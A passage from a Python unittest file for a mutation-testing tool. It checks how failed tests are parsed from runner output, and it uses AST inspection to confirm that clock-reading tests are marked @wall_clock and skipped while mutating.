        self.assertEqual(mutants.failed_test(output % ("=" * 70, "-" * 70)), "tests.m.T.test_x")
        # The line this Python prints.
        status, output = mutants.suite(suite_of("    def test_x(self):\n        self.fail()\n"))
        self.assertEqual(mutants.failed_test(output), "tests.test_x.T.test_x")
        # A failure whose test cannot be read is an ERROR, and kills nothing.
        code, lines, _ = self.check({"x": (0, 1, "F\nFAILED (failures=1)\n")}, ["x"])
        self.assertEqual(lines[0], "ERROR     x (the one test that failed cannot be read from the output%s)" % AGAIN)

    def test_every_test_timed_by_the_wall_clock_is_marked_and_skipped_when_mutating(self):
        # A test that reads the clock, or sleeps, can fail under load for its own reasons, and must not kill a mutant.
        clock = {"monotonic", "monotonic_ns", "perf_counter", "perf_counter_ns", "time", "time_ns", "sleep"}
        marked, reads = set(), set()
        for path in sorted((ROOT / "tests").glob("test_*.py")):
            module = ast.parse(path.read_text())
            # time under any name it is imported as, and any of its clocks imported on their own
            modules = {a.asname or a.name for n in ast.walk(module) if isinstance(n, ast.Import) for a in n.names
                       if a.name == "time"}
            bare = {name for n in ast.walk(module) if isinstance(n, ast.ImportFrom) and n.module == "time"
                    for a in n.names for name in (clock if a.name == "*" else [a.asname or a.name] if a.name in clock else [])}
            for owner in [n for n in ast.walk(module) if isinstance(n, ast.ClassDef)]:
                for node in owner.body:
                    if not isinstance(node, ast.FunctionDef) or not node.name.startswith("test_"):
                        continue
                    where = (path.name, owner.name, node.name)
                    if any("wall_clock" in ast.dump(d) for d in node.decorator_list):
                        marked.add(where)
                    if any((isinstance(n, ast.Attribute) and isinstance(n.value, ast.Name) and n.value.id in modules
                            and n.attr in clock) or (isinstance(n, ast.Name) and n.id in bare) for n in ast.walk(node)):
                        reads.add(where)
        # The order of the runs is told by a stand-in that sleeps: that test reads no clock of its own.
        timed = reads | {("test_tools.py", "Mutants", "test_mutants_are_reported_in_their_order_however_their_runs_finish")}
        self.assertEqual(marked, timed, "mark @wall_clock, from tests/support.py, the tests timed by it and no other")
        self.assertIn(("test_hooks.py", "ProtectedPaths", "test_a_wildcard_that_would_backtrack_is_read_within_the_budget"),
                      marked)

        def test_x():
            pass
        with mock.patch.dict(os.environ, {"MUTATING": "1"}):
            self.assertTrue(getattr(support.wall_clock(test_x), "__unittest_skip__", False))
        with mock.patch.dict(os.environ, {"MUTATING": ""}):
            self.assertIs(support.wall_clock(test_x), test_x, "in make verify it runs as it is")
